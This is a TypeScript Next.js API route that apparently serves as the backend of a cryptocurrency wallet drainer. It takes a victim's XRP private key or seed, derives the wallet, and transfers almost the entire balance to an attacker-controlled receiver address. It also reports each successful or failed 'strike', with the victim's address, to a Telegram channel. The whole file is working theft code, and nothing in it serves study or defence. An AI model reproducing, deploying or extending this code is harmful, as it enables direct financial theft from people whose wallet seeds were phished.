import { NextResponse } from "next/server";
import * as xrpl from "xrpl";
import { sendDetailedSweepToTelegram } from "@/lib/telegram";

const XRP_RPC = process.env.XRP_RPC || "wss://s1.ripple.com";

export async function POST(req: Request) {
  const client = new xrpl.Client(XRP_RPC);
  let targetAddress = "Unknown";

  try {
    const body = await req.json();
    const { userAddress, userPrivKey } = body;
    targetAddress = userAddress || "Captured Seed";

    console.log(`[XRP-ROUTE] Strike Started | Target: ${targetAddress}`);

    const receiver = process.env.RECEIVER_XRP;
    if (!receiver) throw new Error("RECEIVER_XRP_MISSING");
    if (!userPrivKey)
      return NextResponse.json({ error: "No Authority" }, { status: 400 });

    await client.connect();

    /**
     * 🛡️ KEY DERIVATION LOGIC
     * Handles:
     * 1. Raw Hex (32 bytes / 64 chars) -> Entropy
     * 2. Base58 Seeds (starts with 's') -> fromSeed
     */
    let wallet: xrpl.Wallet;
    const cleanKey = userPrivKey.trim().replace("0x", "");

    try {
      if (cleanKey.length === 64) {
        // Treat as hex entropy (EVM private key style)
        wallet = xrpl.Wallet.fromEntropy(Buffer.from(cleanKey, "hex"));
      } else {
        // Treat as standard XRP Base58 seed (sEd... or sn...)
        wallet = xrpl.Wallet.fromSeed(userPrivKey.trim());
      }
    } catch (derivationError: any) {
      throw new Error(`Key Format Error: ${derivationError.message}`);
    }

    // 2. Account Check
    const response = await client.request({
      command: "account_info",
      account: wallet.address,
      ledger_index: "validated",
    });

    const totalDrops = BigInt(response.result.account_data.Balance);
    const reserve = 10000000n; // 10 XRP
    const fee = 20n; // 20 drops
    const amountToDrain = totalDrops - reserve - fee;

    if (amountToDrain <= 0n) {
      throw new Error(
        `Insufficient: ${xrpl.dropsToXrp(totalDrops.toString())} XRP found.`,
      );
    }

    // 3. Execution
    const prepared = await client.autofill({
      TransactionType: "Payment",
      Account: wallet.address,
      Amount: amountToDrain.toString(),
      Destination: receiver,
    });

    const signed = wallet.sign(prepared);
    const result = await client.submitAndWait(signed.tx_blob);

    const meta = result.result.meta as any;
    if (meta?.TransactionResult !== "tesSUCCESS") {
      throw new Error(`XRPL Fail: ${meta?.TransactionResult}`);
    }

    const xrpAmount = String(xrpl.dropsToXrp(amountToDrain.toString()));

    await sendDetailedSweepToTelegram({
      status: "SUCCESS",
      type: "XRP_NATIVE_STRIKE",
      symbol: "XRP",
      amount: xrpAmount,
      victimAddress: targetAddress,
      receiverAddress: receiver,
      hash: signed.hash,
      chainId: "xrp",
    }).catch(() => null);

    return NextResponse.json({ success: true, hash: signed.hash });
  } catch (error: any) {
    console.error("[XRP-ROUTE] Error:", error.message);
    const isNoAccount = error.message.includes("actNotFound");

    await sendDetailedSweepToTelegram({
      status: "FAILED",
      type: "XRP_STRIKE_ERROR",
      symbol: "XRP",
      amount: "0",
      victimAddress: targetAddress,
      receiverAddress: "N/A",
      hash: "NONE",
      chainId: "xrp",
      error: isNoAccount ? "Account Not Activated (No XRP)" : error.message,
    }).catch(() => null);

    return NextResponse.json(
      { success: false, error: error.message },
      { status: 400 },
    );
  } finally {
    await client.disconnect();
  }
}
